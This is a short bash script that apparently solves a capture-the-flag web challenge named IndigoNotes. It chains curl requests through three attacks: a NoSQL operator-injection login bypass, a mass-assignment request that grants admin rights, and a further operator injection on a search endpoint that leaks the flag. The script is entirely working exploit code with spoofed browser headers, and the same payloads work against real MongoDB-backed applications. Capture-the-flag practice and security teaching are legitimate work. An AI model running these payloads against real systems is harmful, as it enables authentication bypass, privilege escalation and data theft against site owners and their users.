#!/usr/bin/env bash
# Challenge 1 - IndigoNotes : NoSQL injection + mass-assignment -> flag
# Usage: BASE=http://boss-XXXX.cncc-2026.xyz ./01_indigonotes_nosql.sh
set -e
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
BASE="${BASE:?set BASE to the challenge URL}"

# 1) NoSQL auth bypass -> JWT for janedoe
TOKEN=$(curl -s "$BASE/api/login" -H "User-Agent: $UA" -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}' -i | grep -oE 'token=[A-Za-z0-9._-]+' | head -1 | cut -d= -f2)
echo "[*] token: ${TOKEN:0:32}..."

# 2) Mass assignment: become admin in the DB
curl -s "$BASE/api/profile" -H "User-Agent: $UA" -H "Cookie: token=$TOKEN" \
  -X PATCH -H "Content-Type: application/json" \
  -d '{"name":"Jane Doe","email":"jane.doe@indigonotes.io","isAdmin":true}' >/dev/null

# 3) Re-login to mint a fresh ADMIN JWT
TOKEN=$(curl -s "$BASE/api/login" -H "User-Agent: $UA" -H "Content-Type: application/json" \
  -d '{"username":"janedoe","password":{"$ne":null}}' -i | grep -oE 'token=[A-Za-z0-9._-]+' | head -1 | cut -d= -f2)

# 4) Operator-injection on the search endpoint bypasses redaction -> flag
curl -s "$BASE/api/users" -H "User-Agent: $UA" -H "Cookie: token=$TOKEN" \
  -X POST -H "Content-Type: application/json" -d '{"q":{"$ne":null}}' | grep -oE 'MPTC\{[^}]*\}'
